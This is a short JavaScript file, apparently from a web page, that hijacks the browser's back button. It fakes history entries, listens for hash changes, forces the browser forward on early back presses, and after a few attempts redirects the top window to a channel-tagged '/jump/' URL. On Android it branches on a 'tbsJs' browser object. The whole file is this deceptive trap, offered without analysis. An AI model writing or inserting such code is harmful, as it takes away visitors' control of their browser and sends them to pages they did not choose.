(function () {

    history.pushState(history.length + 1, "message", window.location.href.split('#')[0] + "#" + new Date().getTime());

    if (navigator.userAgent.indexOf('Android') != -1) {
        console.log("Android-------")
        if (typeof (tbsJs) != "undefined") {
            tbsJs.onReady('{useCachedApi : "true"}', function (e) { });
            window.onhashchange = function () {
                getandjump();
            };
            console.log("tbsJs-------")
        } else {
            var pop = 0;
            window.onhashchange = function (event) {
                // getandjump();
                // return;
                pop++;
                console.log("pop-------", pop)
                if (pop >= 3) {
                    getandjump();
                } else {
                    history.go(1);
                }
            };
            history.go(-1);
        }
    } else {
        console.log("非Android-------")
        window.onhashchange = function () {

            getandjump();
        };
    }
 
    var backUrl;
    function getandjump() {
        window.history.pushState("forward", null, "#");
        window.history.forward(1);

        setTimeout(function () {
            //跳转url --------
            backUrl = "/jump/?ch=wwj201&m=300&c=0"
            top.location.href = backUrl;
        }, 100)
    }


})();




